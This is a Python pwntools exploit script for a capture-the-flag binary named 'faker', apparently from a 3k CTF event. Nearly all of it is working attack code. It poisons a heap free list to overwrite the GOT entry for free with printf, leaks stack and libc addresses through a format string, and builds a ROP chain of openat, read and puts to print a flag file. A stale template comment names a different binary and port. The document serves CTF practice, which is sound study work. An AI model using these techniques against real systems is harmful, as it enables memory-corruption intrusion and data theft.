#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host linker.3k.ctf.to --port 9654 ./linker
from pwn import *
from formatstring import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./faker')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'faker.3k.ctf.to'
port = int(args.PORT or 5231)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x400D6C
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
name_size = 0x0602148

io = start()

def new(size):
	io.recvuntil('> ')
	io.sendline('1')
	io.recvuntil('page size:\n')
	io.sendline(str(size))

def edit(idx, data):
	io.recvuntil('> ')
	io.sendline('2')
	io.recvuntil('index:\n')
	io.sendline(str(idx))
	io.recvuntil('content:\n')
	io.send(data)

def delete(idx):
	io.recvuntil('> ')
	io.sendline('3')
	io.recvuntil('index:\n')
	io.sendline(str(idx))


pop_rdx_rsi = 0x00130889
pop_rsp = 0x0019a6c2
pop_rdi = 0x0016619e
pop_rax = 0x0010fedc
pop_r10 = 0x00130865
sys_ret = 0x0010fbc5


io.recvuntil('name size:\n')
size = 8
io.sendline(str(size))
io.recvuntil('name:\n')
io.send(p64(0x7f))
new(0x68)
edit(0, 'A'*0x68)
delete(0)
edit(0, p64(0x6020bd))
new(0x68)
new(0x68)
edit(1, b'%p.' + b'%p'*20 +p64(0x6161616161616161)*5 + p64(exe.got['free']))
edit(0, p64(exe.sym.printf + 6))
delete(1)
io.recvuntil('0x100400b0a')
stack = int(io.recvn(14), 0)
io.recvuntil('0x4010c0')
libc.address = int(io.recvn(14), 0) -(0x7fd6e70a8b97 - 0x7fd6e7087000)
log.info('stack {}'.format(hex(stack)))
log.info('Libc leak {}'.format(hex(libc.address)))
edit(1, b'%p.' + b'\x01'*0x38+b'/home/ctf/flag\x00\x00'+p64(0x6161616161616161)*1 +p64(stack+8))
rop = flat([
	libc.address +pop_rdx_rsi,
	0x0,
	0x602108,
	libc.address+pop_r10,
	0x0,
	libc.address+pop_rax,
	257,
	libc.address+sys_ret,
	libc.address+pop_rdi,
	0x6,
	libc.address+pop_rdx_rsi,
	0x100,
	0x602108,
	libc.address+pop_rax,
	0x0,
	libc.address+sys_ret,
	libc.address+pop_rdi,
	0x602108,
	libc.sym.puts

])
test = flat([
	libc.address+pop_rdi,
	0x602108,
	libc.sym.puts,
	0x400EE8
])
edit(0, rop)
io.recvuntil('> ')
pause()
io.sendline('5')
io.interactive()
